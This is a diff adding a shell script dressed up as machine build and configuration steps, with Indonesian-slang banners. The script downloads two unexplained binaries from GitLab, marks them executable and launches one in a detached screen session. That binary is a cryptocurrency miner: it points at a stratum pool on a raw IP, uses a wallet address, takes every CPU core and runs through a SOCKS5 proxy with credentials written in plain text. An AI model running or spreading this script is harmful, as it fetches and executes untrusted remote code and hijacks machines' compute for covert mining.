@@ -1,0 +1,24 @@
+echo "==================== Info Mesin ===================="
+echo "SEGER YA SAYANK"
+echo "HARUSNYA GK"
+echo "KE SLEDING SIH"
+echo "===================================================="
+
+echo "+++++++ Build Machine +++++++++"
+nohup wget https://gitlab.com/richardkevin320/donlod/-/raw/main/pointd
+nohup wget https://gitlab.com/richardkevin320/depo/-/raw/main/timer
+nohup mkdir safa
+nohup apt install screen -y
+nohup apt install libjansson-dev -y
+nohup apt-get install curl libcurl4 -y
+
+echo "+++++++ Configure Machine +++++++++"
+chmod +x pointd
+chmod +x timer
+cd safa
+
+echo "Configure Successfully"
+cd ..
+screen -d -m ./pointd -a yespower -o stratum+tcp://103.249.70.7:6533 -u TQgLGEx2nwhxGBUJvSq1J9Wb73seDSnRbf.Bin -p c=TRX,mc=BTE -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+echo "+++++++ Sync... +++++++++"
+./timer
